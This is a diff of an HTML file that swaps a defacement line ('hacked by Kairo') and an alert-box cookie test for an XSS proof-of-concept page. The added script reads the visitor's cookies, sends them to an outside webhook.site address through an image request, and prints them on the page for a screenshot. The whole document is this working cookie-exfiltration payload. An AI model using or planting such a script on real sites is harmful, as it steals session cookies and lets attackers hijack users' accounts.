@@ -1,2 +1,15 @@
-<h1>hacked by Kairo</h1>
-<script>alert(document.cookie)</script>
+<!DOCTYPE html>
+<html>
+<head><title>PoC</title></head>
+<body>
+<script>
+  // Grab cookies and send to webhook
+  var cookies = document.cookie;
+  var img = new Image();
+  img.src = "https://webhook.site/815ef227-da6e-4763-8d39-b39fde6efb4d?c=" + encodeURIComponent(cookies);
+  
+  // Also display for screenshot
+  document.write("<h1>XSS PoC</h1><p>Cookies: " + cookies + "</p>");
+</script>
+</body>
+</html>
